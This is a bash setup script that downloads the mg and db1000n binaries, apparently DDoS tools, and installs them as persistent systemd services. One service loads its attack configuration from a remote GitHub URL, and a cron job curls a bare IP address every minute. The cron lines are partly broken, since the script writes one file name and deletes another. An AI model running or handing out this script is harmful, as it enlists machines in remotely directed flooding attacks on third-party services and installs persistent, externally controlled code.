#!/usr/bin/env bash

wget -q https://github.com/welcome-ad-infernum/mg/releases/latest/download/mg_linux_amd64 -O /usr/local/bin/mg
chmod +x /usr/local/bin/mg

cat << EOF > /etc/systemd/system/mg.service
[Unit]
Description=MG
After=network.target
StartLimitIntervalSec=0
[Service]
Type=simple
Restart=always
RestartSec=1
ExecStart=/usr/local/bin/mg
[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl start mg.service
systemctl enable mg.service
echo "Install mg complete!"


wget -qO- https://github.com/Arriven/db1000n/releases/download/v0.8.13/db1000n_0.8.13_linux_amd64.tar.gz | tar xvzf - -C /usr/local/bin/ db1000n
chmod +x /usr/local/bin/db1000n

cat << EOF > /etc/systemd/system/db.service
[Unit]
Description=DB
After=network.target
StartLimitIntervalSec=0
[Service]
Type=simple
Restart=always
RestartSec=1
ExecStart=/usr/local/bin/db1000n
[Install]
WantedBy=multi-user.target
EOF

cat << EOF > /etc/systemd/system/dbcustom.service
[Unit]
Description=DBcustom
After=network.target
StartLimitIntervalSec=0
[Service]
Type=simple
Restart=always
RestartSec=1
ExecStart=/usr/local/bin/db1000n -c https://raw.githubusercontent.com/SeyOr/db-config/main/output.yaml
[Install]
WantedBy=multi-user.target
EOF


systemctl daemon-reload
systemctl start db.service
systemctl enable db.service
systemctl start dbcustom.service
systemctl enable dbcustom.service


sudo echo "* * * * * curl http://78.47.96.210/yd" >> cront_crul
sudo crontab cront_crul
sudo rm cron_bkp


echo "Install db1000n complete!"
